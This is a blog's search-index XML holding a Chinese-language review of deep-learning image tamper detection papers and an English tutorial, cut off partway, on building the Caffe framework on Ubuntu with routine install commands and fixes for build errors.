<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[Forged Image Detection and Location]]></title>
      <url>http://homeway.me/2018/08/05/tamper-detection-an-overview/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo/forensics-logo.png" alt="Tamper Detection"></p>
<a id="more"></a>
<h1 id="1-Abstract"><a href="#1-Abstract" class="headerlink" title="1.Abstract"></a>1.Abstract</h1><p>图像处理检测有两个研究类别：图像后处理检测（Image Manipulation Detection）和图像篡改检测（Tamper Detection）。</p>
<p>（1）图像后处理检测主要挖掘图像是否经历过：中值滤波处理（Median Filtering）、高斯模糊处理（Gaussian Blurring）、添加高斯白噪声（Additive White Gaussian Noise）、重采样（Resampling）、JPEG 压缩（JPEG Compression）等后处理操作。</p>
<p>（2）另一方面图像篡改检测旨在挖掘数字图像的恶意处理，例如删除（Removal）、添加（Adding）、复制（Copy）、截取（Splicing）图像中的对象。</p>
<p>图像处理检测在军事防卫、司法鉴定、图像防伪等领域有重要的价值。</p>
<p>本文旨在通过分析近年来基于深度学习的图像篡改检测发展，总结该方向主要发展方向、可以探索方向。</p>
<hr>
<h1 id="2-Introduction"><a href="#2-Introduction" class="headerlink" title="2.Introduction"></a>2.Introduction</h1><p>图像篡改检测从篡改方法上可以分为：</p>
<ul>
<li>（1）图像接片检测（Image Splicing Detection）</li>
<li><p>（2）图像复制-黏贴检测（Copy-Move Detection）</p>
</li>
<li><p>（3）图像对象移除检测（Object Removal Detection）</p>
</li>
</ul>
<p>（1）和（2）有本质区别，（1）主要通过截取图像A的某个物体到图像B，并检测图像B是否被篡改；（2）主要用过复制图像A的某个物体，移动到另外一个位置，并检测图像A是否被篡改，即（1）的复制物体来自于多个图像，（2）的物体对象来自同一张图像。</p>
<p>关于（1）的例子如下，图像中的第三张图来源于原图像A，原图像B中防火栓标志的合成：</p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-splicing.jpg" alt="Image Splicing"></p>
<p>关于（2）Copy-Move的比较有名的例子是伊朗导弹齐射伪造事件。</p>
<p>2008年伊朗不断发布该国“试射多枚远程导弹”的消息，随后《纽约时报》发现，这张有四枚导弹腾空而起的照片存在被“人为修改”的痕迹：其中一枚导弹（从小图2右侧数第二枚）很可能是照片上其他两枚导弹“PS后的产物”。</p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-Iran.jpg" alt="Iran fake image"></p>
<p>目前，对于（1）、（2）检测的算法比较多，而针对（3）的算法比较少见，接下来我们将分析最近几年使用深度学习解决上面几个问题论文，从而分析该领域的当前现状、未来方向。</p>
<hr>
<h1 id="3-Related-Work"><a href="#3-Related-Work" class="headerlink" title="3.Related Work"></a>3.Related Work</h1><p>关于上述几种篡改方法，图像篡改检测算法大致可以分为传统算法和深度学习算法，传统算法的特点是手工提取特征、建立模型、分析特征并分类；深度学习的算法主要通过使用CNN模型，提取特征，并通过Softmax分类，实现端到端（end-to-end）自适应学习模式。</p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-algorithms.png" alt="基于深度学习模型数字图像篡改分析架构(右)和基于手工制作功能的传统数字图像篡改分析架构(左)。&lt;br&gt;右侧流程图中的向上和向下箭头显示前向和后向传播方向。"></p>
<p>[2] 总结了这两种算法的框架模型，基于深度学习模型数字图像篡改分析架构将像素作为输入，并且由三种层组成：图像处理层，用于特征表示的若干卷积层，以及用于分类的若干完全连接的层。端到端自动检测系统最大的优势是自动学习参数。接下来我们分析下近年来几篇基于深度学习模型数字图像篡改分析论文。</p>
<hr>
<p><br><br></p>
<h4 id="1-A-deep-learning-approach-to-detection-of-splicing-and-copy-move-forgeries-in-images-3"><a href="#1-A-deep-learning-approach-to-detection-of-splicing-and-copy-move-forgeries-in-images-3" class="headerlink" title="1.A deep learning approach to detection of splicing and copy-move forgeries in images [3]"></a>1.A deep learning approach to detection of splicing and copy-move forgeries in images [3]</h4><p>这篇论文是2016年发表在WIFS，关于深度学习模型数字图像篡改的开山之作。</p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-paper1.1.jpg" alt="10层卷积层的架构模型"></p>
<p>文章提出了一种基于深度学习技术的伪造图像伪造检测方法，该方法包含10层卷积层，其中第一层为SRM富模型（spatial rich model）[4] 预处理层，有助于加快网络收敛；输出使用SVM二分类；中间层卷积核多为3x3。</p>
<p>早年算法，整体来看比较中规中矩，只能做到检测是否篡改（Detection ），无法做到定位（Localization ），同时使用的是CASIA v1.0、CASIA v2.0、Columbia gray DVMM 这三个数据库完成实验。<br></p>
<h4 id="2-Detection-and-Localization-of-Image-Forgeries-using-Resampling-Features-and-Deep-Learning-5"><a href="#2-Detection-and-Localization-of-Image-Forgeries-using-Resampling-Features-and-Deep-Learning-5" class="headerlink" title="2.Detection and Localization of Image Forgeries using Resampling Features and Deep Learning [5]"></a>2.Detection and Localization of Image Forgeries using Resampling Features and Deep Learning [5]</h4><p>这篇文章是2017年发表在CVPR Workshop，使用重采样算法实现篡改检测的算法。</p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-paper2.jpg" alt="用于检测和本地化数字操作的端到端框架"></p>
<p>算法主要包含2个步骤，第一，通过重叠的图像块计算重采样随机特征；第二，使用深度学习分类器和高斯条件随机场模型来创建热力图，从而定位篡改区域。算法先将图像块重叠堆放，然后使用CNN特诊提取，接着建立统计学模型，根据统计直方分布，分析篡改小块的位置。</p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-image-processing.jpg" alt="数字图像成像过程"></p>
<p>上图显示了数字图像成像过程，其中成像过程需要经历：模拟信号处理、数字信号处理，其中模拟信号处理包含镜头偏移、CFA插值等；数字信号处理包含了去马赛克、伽马矫正、重采样等等，而不同的图像的重采样程度是不同的，经过篡改必然导致篡改部位重采样率的差异，文章的算法正是源于这个原理。<br></p>
<h4 id="3-Tampering-Detection-and-Localization-through-Clustering-of-Camera-Based-CNN-Features-6"><a href="#3-Tampering-Detection-and-Localization-through-Clustering-of-Camera-Based-CNN-Features-6" class="headerlink" title="3.Tampering Detection and Localization through Clustering of Camera-Based CNN Features[6]"></a>3.Tampering Detection and Localization through Clustering of Camera-Based CNN Features[6]</h4><p>这篇文章也是发表在CVPR Workshop的基于CNN篡改检测、定位的文章。</p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-paper3.1.png" alt="图像I被分成块P(ij)。 每个补丁由通过CNN提取的特征向量f(ij)和置信度得分Q(ij)描述。&lt;br&gt;自定义聚类算法产生篡改掩码预测M，其也用于检测。"></p>
<p>文章提出了一种图像篡改检测和定位算法，利用不同相机模型留在图像上的特征足迹，最直接的原理即是检测图像的拍摄相机来源，由于不同型号相机拍摄的照片所携带的模式噪声不一样，以此鉴定图像是否篡改、篡改定位。</p>
<p>这篇文章是作者 Bondi 在2016年发表<a href="https://ieeexplore.ieee.org/abstract/document/7786852/" target="_blank" rel="external">[7]</a>的工作的延续，<a href="https://ieeexplore.ieee.org/abstract/document/7786852/" target="_blank" rel="external">[7]</a>通过建立<strong>CNN+SVM模型</strong>，鉴定数字图像拍摄来源，但是存在一定的缺陷，即是相同型号相机生成的图像篡改无法被检测出来。算法的基本模型考虑到了两层因数：第一，CNN检测到的部位是否被篡改（即f(i, j)）；第二，我们知道纹理度低的部位的篡改明显存在误差，因此，作者根据纹理度计算公式对每个图像小块计算置信度因子（即Q(i, j)），其中Q(i, j)定义为：</p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-paper3.2.png" alt="纹理度转换置信度计算公式"></p>
<p>最后将两个计算结果合成后得到篡改部位的置信度热力图，1.CNN输出f做K-means聚类；2.对检测散点图做密度去噪（检测最小篡改粒度为128x128）；3.并使用纹理度去噪（不计算纹理度低的检测结果）；4.最终使用平均篡改率（篡改点÷所有测点）阈值判定输入图像是否为篡改图像，得到最终的结果：</p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-paper3.3.jpg" alt="所提出的定位算法的伪造图像和中间输出的示例，伪造用红色虚线突出显示。&lt;br&gt;K-means检测到的簇被映射到不同的颜色，白色和黑色像素分别代表M的0和1值。"></p>
<p>算法使用Dresden图像库，该数据集由来自26种不同相机模型的超过16k图像组成，描绘了总共83个场景，关于篡改图像如何制作，本文作者没有解释。这篇文章做得相对完整，从图像切片（patches）-&gt;CNN特征提取/Q纹理度换算置信度-&gt;整合块热力图-&gt;除噪，每个步骤都很扎实。</p>
<p><br></p>
<h4 id="4-Reliability-Map-Estimation-For-CNN-Based-Camera-Model-Attribution-8"><a href="#4-Reliability-Map-Estimation-For-CNN-Based-Camera-Model-Attribution-8" class="headerlink" title="4.Reliability Map Estimation For CNN-Based Camera Model Attribution [8]"></a>4.Reliability Map Estimation For CNN-Based Camera Model Attribution [8]</h4><p>这篇文章是<a href="http://openaccess.thecvf.com/content_cvpr_2017_workshops/w28/papers/Tubaro_Tampering_Detection_and_CVPR_2017_paper.pdf" target="_blank" rel="external">[6]</a>经过简单修改后重新发的文章，本质上没有很大的变化。</p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-paper4.1.jpg" alt="Block diagram of the proposed approach. Image I is split into patches. Each patch Pk, k∈[0, K] is processed by the proposed CNN (composed by Mcam and Mip) to obtain a reliability score gk and a camera model estimate."></p>
<p>文章提出了一个置信度（Reliability）图模型，将补丁块（Patch）放入CNN先训练模型、提取特征，然后得到热力图，得到最终的置信度热力图后除噪过滤出篡改部位。</p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-paper4.2.jpg" alt="Accuracy curves on training (Dip) and validation T(DV) datasets using Pre-Trained and Transfer strategies"></p>
<p>算法主要分为两部分，CNN特征提取、置信度图去噪，其中CNN特征提取使用了预训练（Pre-Trained）方法和迁移学习方法（Transfer），上面是算法在训练集、校验集的正确率。<br></p>
<h5 id="5-Deep-Matching-and-Validation-Network-An-End-to-End-Solution-to-Constrained-Image-Splicing-Localization-and-Detection-9"><a href="#5-Deep-Matching-and-Validation-Network-An-End-to-End-Solution-to-Constrained-Image-Splicing-Localization-and-Detection-9" class="headerlink" title="5.Deep Matching and Validation Network: An End-to-End Solution to Constrained Image Splicing Localization and Detection [9]"></a>5.Deep Matching and Validation Network: An End-to-End Solution to Constrained Image Splicing Localization and Detection [9]</h5><p>文章发表在2017 ACM on Multimedia Conference，作者代码在Gitlab: <a href="https://gitlab.com/rex-yue-wu/Deep-Matching-Validation-Network" target="_blank" rel="external">https://gitlab.com/rex-yue-wu/Deep-Matching-Validation-Network</a></p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-paper5.1.2.jpg" alt="Constrained image splicing detection problem, where true spliced pixels are labeled as white. From top to bottom, sample detection labels are 1, 1, and 0, respectively. "></p>
<p>文章考虑的主要问题是<strong>限制性的图像篡改检测问题</strong>(constrained image splicing detection (CISD) problem)，即问题提供查询图像Q和潜在篡改来源图像P，需要从图像Q中检测是否有物体来源于图像P，问题更倾向于Copy-Move篡改模型。文章提出一种<strong>深度匹配网络(Deep Matching and Verification Network (DMVN))</strong>，扩展了底层拼接问题的公式，以考虑两个输入图像，一个查询图像Q和一个潜在的供体图像P。</p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-paper5.2.jpg" alt="Deep matching and validation network for the constrained image splicing detection and localization. "></p>
<p>文章提到创新点为：(1) 相比传统算法，DMVN是一种端到端(End-to-End)模型；(2) 相比其他深度学习算法，DMVN不仅特征提取自动，而且后处理也是非干预；(3) 创新地提出深度学习模块（Deep Dense Matching和Visual Consistency Validator），用于执行视觉匹配和验证。</p>
<p>仔细地看了下论文，算法主要包含以下流程(1) CNN Feature Extractor：使用的是VGG-16；(2)  Deep Dense Matching：使用的是inception-based Mask Deconvolution模块，来源于<a href="https://www.cv-foundation.org/openaccess/content_cvpr_2016/html/Szegedy_Rethinking_the_Inception_CVPR_2016_paper.html" target="_blank" rel="external">[10]</a>；(3) Visual Consistency Validator：用于强制模型聚焦于两个图像中的分割区域，将两个Mask快融合起来。总体看来，是将多个深度学习网络拼接起来。</p>
<p><br></p>
<h5 id="6-Image-Splicing-Detection-via-Camera-Response-Function-Analysis-11"><a href="#6-Image-Splicing-Detection-via-Camera-Response-Function-Analysis-11" class="headerlink" title="6. Image Splicing Detection via Camera Response Function Analysis [11]"></a>6. Image Splicing Detection via Camera Response Function Analysis [11]</h5><p>文章发表在2017 CVPR上面，主要采用相机响应函数（Camera Response Function, CRF）分析篡改部位的轮廓直方图差异，并以此鉴定Copy-Move和Splicing篡改。非线性CRF对于图像处理有很大作用，很多图像去燥算法有所使用，实验表明篡改区域的CRF值比起未篡改区域有所不同。虽然目前的研究未知CRF如何成为模糊估计中的噪声源，但是文章证明CRF是一个关键信号，有助于区分不同的边缘和伪造的拼接边界。</p>
<h1 id="4-Conclusion"><a href="#4-Conclusion" class="headerlink" title="4. Conclusion"></a>4. Conclusion</h1><p>笔者尝试重现了<a href="http://openaccess.thecvf.com/content_cvpr_2017_workshops/w28/papers/Tubaro_Tampering_Detection_and_CVPR_2017_paper.pdf" target="_blank" rel="external">[6] Bondi</a>的算法，该算法聚类过程的重现代码已经开源：<a href="https://github.com/grasses/Tampering-Detection-and-Localization/blob/master/experiment/2-2.ipynb" target="_blank" rel="external">https://github.com/grasses/Tampering-Detection-and-Localization/blob/master/experiment/2-2.ipynb</a>。其中：<br>（1）CNN特征提取的算法比较普通；<br>（2）后处理中滤波算法显得比较出众，主要有两种：①对CNN输出执行度做L1范式滤波，②对于去除低文理区域预测结果，对于图像纹理度指数获取算法，网上、文献里面都没有找到，应该是作者自己的研究。</p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-testing.1.jpg?t=" alt="(a)图像原始图；(2)使用[7]中的文理检测算法得到的热力图"></p>
<p>上图显示了原始图像（左侧）与该图像的纹理度热力图（右侧），纹理度可知：最有可能篡改的部位为树，因此在算法[6]滤波时候存在一定的可能性过度过滤噪点。<br></p>
<p>另一方面，笔者在自己的文章中提出了一种可靠性融合算法<a href="https://github.com/grasses/Tampering-Detection-and-Localization" target="_blank" rel="external">（Reliablity Fusing Map (RFM)）</a>，主要研究CNN输出的置信度向量关系，并通过两步融合生成篡改区域二值图，该研究主要贡献为：（1）获得更高的准确性; （2）降低聚类的计算复杂度; （3）将定位细度从64x64提高到32x32。下图主要显示了算法的实验结果：</p>
<p><img src="https://static.blog.homeway.me/blog/image/2018.08.05-tamper-detection-testing.3.jpg" alt="笔者论文实现的效果，"></p>
<p>上图显示了用<a href="http://openaccess.thecvf.com/content_cvpr_2017_workshops/w28/papers/Tubaro_Tampering_Detection_and_CVPR_2017_paper.pdf" target="_blank" rel="external">[6] Bondi</a>等人提出的方法和笔者提出的RFM方法进行对比实验的结果。（a）-（c）分别示出了原始图像、伪造图像和真实篡改区域图像。（d）和（e）分别表RFM算法对于未篡改图像和篡改图像的检测结果，（f）显示Bondi等人的模拟实验结果。 我们篡改检测将定位的细度从64x64图像块提高到32x32图像块，说明RFM算法可以检测更细小的篡改痕迹（参见（e）和（f））。</p>
<h5 id="简单做个总结："><a href="#简单做个总结：" class="headerlink" title="简单做个总结："></a>简单做个总结：</h5><ul>
<li>大部分深度学习算法离不开传统算法的原理，基本上都源于数字图像的成像过程留下的模式噪声；</li>
<li>目前算法基本上可以同时解决检测篡改（Detection ）、篡改定位（Localization ）；</li>
<li>深度学习鉴定复制-黏贴（Copy-Move）的算法比较少，关键是如何让算法认识到寻找两个相似物体，基本上都是研究接片检测（Image splicing）；</li>
<li>目前的主要算法可以分为：传统手工特征统计学习模型；机器学习半自动化模型；深度学习全自动模型(End-to-End)；</li>
</ul>
<hr>
<h1 id="5-Reference"><a href="#5-Reference" class="headerlink" title="5. Reference"></a>5. Reference</h1><ul>
<li><p><a href="http://cdmd.cnki.com.cn/Article/CDMD-10183-1017152233.htm" target="_blank" rel="external">[1] 朱叶. 数字图像复制—粘贴篡改盲取证关键技术研究[D]. 吉林大学, 2017.</a></p>
</li>
<li><p>[2] Qian, Y., Dong, J., Wang, W., &amp; Tan, T. (2015, March). Deep learning for steganalysis via convolutional neural networks. In <em>Media Watermarking, Security, and Forensics 2015</em> (Vol. 9409, p. 94090J). International Society for Optics and Photonics.</p>
</li>
<li><p><a href="https://ieeexplore.ieee.org/abstract/document/7823911/" target="_blank" rel="external">[3] Rao, Y., &amp; Ni, J. (2016, December). A deep learning approach to detection of splicing and copy-move forgeries in images. In <em>Information Forensics and Security (WIFS), 2016 IEEE International Workshop on</em> (pp. 1-6). IEEE.</a></p>
</li>
<li><p><a href="https://ieeexplore.ieee.org/abstract/document/6197267/" target="_blank" rel="external">[4] J. Fridrich, and J. Kodovsky ́, “Rich models for steganalysis of digital images,” IEEE Transactions on Information Forensics and Security, vol. 7, no. 3, pp. 868-882, June 2012. </a></p>
</li>
<li><p><a href="https://ieeexplore.ieee.org/abstract/document/8014969/" target="_blank" rel="external">[5] Bunk, J., Bappy, J. H., Mohammed, T. M., Nataraj, L., Flenner, A., Manjunath, B. S., … &amp; Peterson, L. (2017, July). Detection and localization of image forgeries using resampling features and deep learning. In <em>Computer Vision and Pattern Recognition Workshops (CVPRW), 2017 IEEE Conference on</em>(pp. 1881-1889). IEEE.</a></p>
</li>
<li><p><a href="http://openaccess.thecvf.com/content_cvpr_2017_workshops/w28/papers/Tubaro_Tampering_Detection_and_CVPR_2017_paper.pdf" target="_blank" rel="external">[6] Bondi, L., Lameri, S., Guera, D., Bestagini, P., Delp, E. J., &amp; Tubaro, S. (2017, July). Tampering Detection and Localization Through Clustering of Camera-Based CNN Features. In <em>CVPR Workshops</em> (pp. 1855-1864).</a></p>
</li>
<li><p><a href="https://ieeexplore.ieee.org/abstract/document/7786852/" target="_blank" rel="external">[7] Bondi, L., Baroffio, L., Güera, D., Bestagini, P., Delp, E. J., &amp; Tubaro, S. (2017). First steps toward camera model identification with convolutional neural networks. <em>IEEE Signal Processing Letters</em>, <em>24</em>(3), 259-263.</a></p>
</li>
<li><p><a href="https://arxiv.org/abs/1805.01946" target="_blank" rel="external">[8] Güera, D., Yarlagadda, S. K., Bestagini, P., Zhu, F., Tubaro, S., &amp; Delp, E. J. (2018). Reliability Map Estimation For CNN-Based Camera Model Attribution. *arXiv preprint arXiv:1805.01946.</a></p>
</li>
<li><p><a href="https://dl.acm.org/citation.cfm?id=3123411" target="_blank" rel="external">[9] Wu, Y., Abd-Almageed, W., &amp; Natarajan, P. (2017, October). Deep matching and validation network: An end-to-end solution to constrained image splicing localization and detection. In <em>Proceedings of the 2017 ACM on Multimedia Conference</em> (pp. 1480-1502). ACM.</a></p>
</li>
<li><p><a href="https://www.cv-foundation.org/openaccess/content_cvpr_2016/html/Szegedy_Rethinking_the_Inception_CVPR_2016_paper.html" target="_blank" rel="external">[10] Szegedy, C., Vanhoucke, V., Ioffe, S., Shlens, J., &amp; Wojna, Z. (2016). Rethinking the inception architecture for computer vision. In <em>Proceedings of the IEEE conference on computer vision and pattern recognition</em> (pp. 2818-2826).</a></p>
</li>
<li><p><a href="http://openaccess.thecvf.com/content_cvpr_2017/papers/Chen_Image_Splicing_Detection_CVPR_2017_paper.pdf" target="_blank" rel="external">[11] Chen, Can, Scott McCloskey, and Jingyi Yu. “Image Splicing Detection via Camera Response Function Analysis.” <em>Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition</em>. 2017.</a></p>
</li>
</ul>
<hr>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2018-08-05-tamper-detection-an-overview"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2018-08-05-tamper-detection-an-overview" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2018/08/05/tamper-detection-an-overview"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2018/08/05/tamper-detection-an-overview/">http://homeway.me/2018/08/05/tamper-detection-an-overview</a></h4><blockquote>
<p>by grasses 2018.08.05</p>
</blockquote>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Deep Learning - Installing Caffe on Ubuntu]]></title>
      <url>http://homeway.me/2018/01/25/setup-caffe-for-deep-learning/</url>
      <content type="html"><![CDATA[<p><br><br><img src="https://static.blog.homeway.me/blog/logo/caffe-logo.png" alt="Caffe"><br><a id="more"></a></p>
<p>Recently, I want to try another deep learning framework instead of tensorflow.<br>I find Caffe (Convolutional Architecture for Fast Feature Embedding), which is another deep learning framework, originally developed at UC Berkeley, is easy to handle. There are still a bunch of troubles, the biggest one is the environment of installation. </p>
<p>Many developers are complaining about the complex dependence of Caffe environment, I try it today, it really runs into many problems.<br>In this tutorial, I mainly talke about how to build Caffe environment on 64-bit Ubuntu 16.04 Linux.</p>
<p>In Caffe official home page, we can find the installation tutorial: <a href="http://caffe.berkeleyvision.org/install_apt.html" target="_blank" rel="external">http://caffe.berkeleyvision.org/install_apt.html</a>,<br>which still remaining a stack of problems for different system environments.<br>In order to install Caffe, we need to prepare some dependencies softwares including: libgflags, libatlas, libgoogle-glog, libmdb, python-dev,  while for GPU support, we need to extra install Nvidia driver, cuDNN, opencv3+.<br>After successfully installing those packages, we also need to modify the <code>Makefile.config</code> to tell the compiler where to find it.</p>
<hr>
<h1 id="1-General-dependencies"><a href="#1-General-dependencies" class="headerlink" title="1.General dependencies"></a>1.General dependencies</h1><p>First of all, check our ubuntue apt-get source list is updated:</p>
<pre><code>sudo apt-get update -y
</code></pre><p>Next, following installation tutorial of home page, we may install the dependencies:</p>
<pre><code>sudo apt-get install python-dev libprotobuf-dev libleveldb-dev libsnappy-dev libopencv-dev libhdf5-serial-dev protobuf-compiler  -y
sudo apt-get install --no-install-recommends libboost-all-dev  -y
</code></pre><hr>
<h1 id="2-Install-Caffe-package"><a href="#2-Install-Caffe-package" class="headerlink" title="2.Install Caffe package"></a>2.Install Caffe package</h1><p>Secondly, clone Caffe repository, and make a copy of file Makefile.config.example:</p>
<pre><code>git clone https://github.com/BVLC/caffe
cd caffe
cp Makefile.config.example Makefile.config
</code></pre><p>Install basic python dependencies:</p>
<pre><code>sudo pip install numpy scikit-image protobuf
cd python
for req in $(cat requirements.txt); do sudo pip install $req; done
cd ../
</code></pre><p>To this step, we have installed all dependencies for Caffe, we shall tell compiler where to find the package next step.<br>Edit <code>Makefile.config</code> just for cpu support here, if you want to make it supporting gpu, please switch to Step-3:</p>
<pre><code>➜  $: vim Makefile.config
...
# cuDNN acceleration switch (uncomment to build with cuDNN).
USE_CUDNN := 0
# CPU-only switch (uncomment to build without GPU support).
CPU_ONLY := 1
...
# Change INCLUDE_DIRS to add hdf5 files, if you have problem with hdf5.h package, please see Step-4.3.
INCLUDE_DIRS := $(PYTHON_INCLUDE) /usr/local/include /usr/include/hdf5/serial
LIBRARY_DIRS := $(PYTHON_LIB) /usr/local/lib /usr/lib /usr/lib/x86_64-linux-gnu/hdf5/serial
...
#: Change python include package path.
PYTHON_INCLUDE := /usr/include/python2.7 \
    /usr/local/lib/python2.7/dist-packages/numpy/core/include
...
</code></pre><p>After check everything is installed, we begin to compile Caffe, for any fatal error, please see Step-4:</p>
<pre><code>make all
</code></pre><p>If no error occur, just to test:</p>
<pre><code>make test &amp;&amp; make runtest
</code></pre><p>We shall see the successful interface like this:<br><img src="https://static.blog.homeway.me/blog/image/2018-01-25-Caffe-successfully-installed.png.png" alt="Successful installed Caffe"></p>
<hr>
<h1 id="3-Setup-for-GPU-supporting"><a href="#3-Setup-for-GPU-supporting" class="headerlink" title="3.Setup for GPU supporting"></a>3.Setup for GPU supporting</h1><p>To make our Caffe supporting GPU, we shall install Nvidia development toolkit at first, tutorial of installation please see: <a href="http://homeway.me/2017/08/08/setup-gpu-for-tensorflow/">http://homeway.me/2017/08/08/setup-gpu-for-tensorflow/</a><br>Next is opencv3+: <a href="https://www.learnopencv.com/install-opencv3-on-ubuntu/" target="_blank" rel="external">https://www.learnopencv.com/install-opencv3-on-ubuntu/</a></p>
<p>After a series of installation steps, just edit <code>Makefile.config</code> for compiling:</p>
<pre><code>➜  $: vim Makefile.config
...
# cuDNN acceleration switch (uncomment to build with cuDNN).
USE_CUDNN := 1
# CPU-only switch (uncomment to build without GPU support).
CPU_ONLY := 0
...
# CUDA directory contains bin/ and lib/ directories that we need.
CUDA_DIR := /usr/local/cuda
...
# Uncomment if you&#39;re using OpenCV 3
OPENCV_VERSION := 3
...
# Change INCLUDE_DIRS to add hdf5 files, if you have problem with hdf5.h package, please see Step-4.3.
INCLUDE_DIRS := $(PYTHON_INCLUDE) /usr/local/include /usr/include/hdf5/serial
LIBRARY_DIRS := $(PYTHON_LIB) /usr/local/lib /usr/lib /usr/lib/x86_64-linux-gnu/hdf5/serial
...
#: Change python include package path.
PYTHON_INCLUDE := /usr/include/python2.7 \
    /usr/local/lib/python2.7/dist-packages/numpy/core/include
...
</code></pre><p>Everything is ok, just wait for successful testing in screen:</p>
<pre><code>make all
make test &amp;&amp; make runtest
</code></pre><hr>
<h1 id="4-Fix-bugs"><a href="#4-Fix-bugs" class="headerlink" title="4.Fix bugs"></a>4.Fix bugs</h1><p>Make a summary, here lists some common mistakes and solutions, mostly due to missing packages or packages not found by compiler, just install it and tell compiler.</p>
<h2 id="4-1-gflags-not-found"><a href="#4-1-gflags-not-found" class="headerlink" title="4.1 gflags not found"></a>4.1 gflags not found</h2><p>Error description:</p>
<pre><code>PROTOC src/caffe/proto/caffe.proto
CXX .build_release/src/caffe/proto/caffe.pb.cc
CXX src/caffe/layer.cpp
In file included from ./include/caffe/blob.hpp:8:0,
                 from ./include/caffe/layer.hpp:8,
                 from src/caffe/layer.cpp:1:
./include/caffe/common.hpp:5:27: fatal error: gflags/gflags.h: ?????????
compilation terminated.
Makefile:581: recipe for target &#39;.build_release/src/caffe/layer.o&#39; failed
make: *** [.build_release/src/caffe/layer.o] Error 1
</code></pre><p>Just install it, and try again:</p>
<pre><code>sudo apt-get install libgflags-dev -y
</code></pre><h2 id="4-2-glog-not-found"><a href="#4-2-glog-not-found" class="headerlink" title="4.2 glog not found"></a>4.2 glog not found</h2><p>Error description:</p>
<pre><code>CXX src/caffe/layer.cpp
In file included from ./include/caffe/blob.hpp:8:0,
                 from ./include/caffe/layer.hpp:8,
                 from src/caffe/layer.cpp:1:
./include/caffe/common.hpp:6:26: fatal error: glog/logging.h: ?????????
compilation terminated.
Makefile:581: recipe for target &#39;.build_release/src/caffe/layer.o&#39; failed
make: *** [.build_release/src/caffe/layer.o] Error 1
</code></pre><p>Install it by apt-get package:</p>
<pre><code>sudo apt-get install libgoogle-glog-dev liblmdb-dev -y
</code></pre><p>Or install it from source package, installation wiki from Github: <a href="https://github.com/google/glog/wiki/Installing-Glog-on-Ubuntu-14.04" target="_blank" rel="external">Installing Glog on Ubuntu 14.04</a></p>
<pre><code>#: remove the old gflags 
sudo apt-get purge libgflags-dev
#: download glog from github
git clone https://github.com/google/glog &amp;&amp; cd glog
# compiling
mkdir build &amp;&amp; cd build
cmake -DGFLAGS_NAMESPACE=google -DCMAKE_CXX_FLAGS=-fPIC ..
make &amp;&amp; sudo make install
</code></pre><h2 id="4-3-hdf5-h"><a href="#4-3-hdf5-h" class="headerlink" title="4.3 hdf5.h"></a>4.3 hdf5.h</h2><p>Error description:</p>
<pre><code>src/caffe/layers/hdf5_data_layer.cpp:13:18: fatal error: hdf5.h: No such file or directory
compilation terminated.
Makefile:581: recipe for target &#39;.build_release/src/caffe/layers/hdf5_data_layer.o&#39; failed
make: *** [.build_release/src/caffe/layers/hdf5_data_layer.o] Error 1
</code></pre><p>In general, we have installed hdf5.h package in Step-1, the problem is that compiler does not know where to find header file <code>hdf5.h</code>.<br>First, let’s check it exists, enter the following command, we should see like this:</p>
<pre><code>➜  $: ls /usr/lib/x86_64-linux-gnu/ | grep libhdf5_serial
...
libhdf5_serial.so.10.1.0
libhdf5_serialhl_fortran.so.10.0.2
...
</code></pre><p>We can find two files like above, please don’t care about version, what we need to just make a soft link for it:</p>
<pre><code>sudo ln -s /usr/lib/x86_64-linux-gnu/libhdf5_serial.so.10.1.0 /usr/lib/x86_64-linux-gnu/libhdf5.so
sudo ln -s /usr/lib/x86_64-linux-gnu/libhdf5_serial_hl.so.10.0.2 /usr/lib/x86_64-linux-gnu/libhdf5_hl.so
</code></pre><p>We need to edit <code>Makefile.conf</code> to tell compiler where to find <code>hdf5.h</code></p>
<pre><code>vim Makefile.config
</code></pre><p>Change lines 95~96 like this:</p>
<pre><code># Whatever else you find you need goes here.
INCLUDE_DIRS := $(PYTHON_INCLUDE) /usr/local/include /usr/include/hdf5/serial
LIBRARY_DIRS := $(PYTHON_LIB) /usr/local/lib /usr/lib /usr/lib/x86_64-linux-gnu/hdf5/serial
</code></pre><p>And ok now, try to compile again.</p>
<h2 id="4-4-liblmdb-not-found"><a href="#4-4-liblmdb-not-found" class="headerlink" title="4.4 liblmdb not found"></a>4.4 liblmdb not found</h2><p>Error description:</p>
<pre><code>In file included from src/caffe/util/db.cpp:3:0:
./include/caffe/util/db_lmdb.hpp:8:18: fatal error: lmdb.h: No such file or directory
compilation terminated.
Makefile:581: recipe for target &#39;.build_release/src/caffe/util/db.o&#39; failed
make: *** [.build_release/src/caffe/util/db.o] Error 1
</code></pre><p>Fix it:</p>
<pre><code>sudo apt install liblmdb-dev -y
</code></pre><h2 id="4-5-opencv3-not-found"><a href="#4-5-opencv3-not-found" class="headerlink" title="4.5 opencv3 not found"></a>4.5 opencv3 not found</h2><p>Error description:</p>
<pre><code>/usr/bin/ld: cannot find -lopencv_imgcodecs
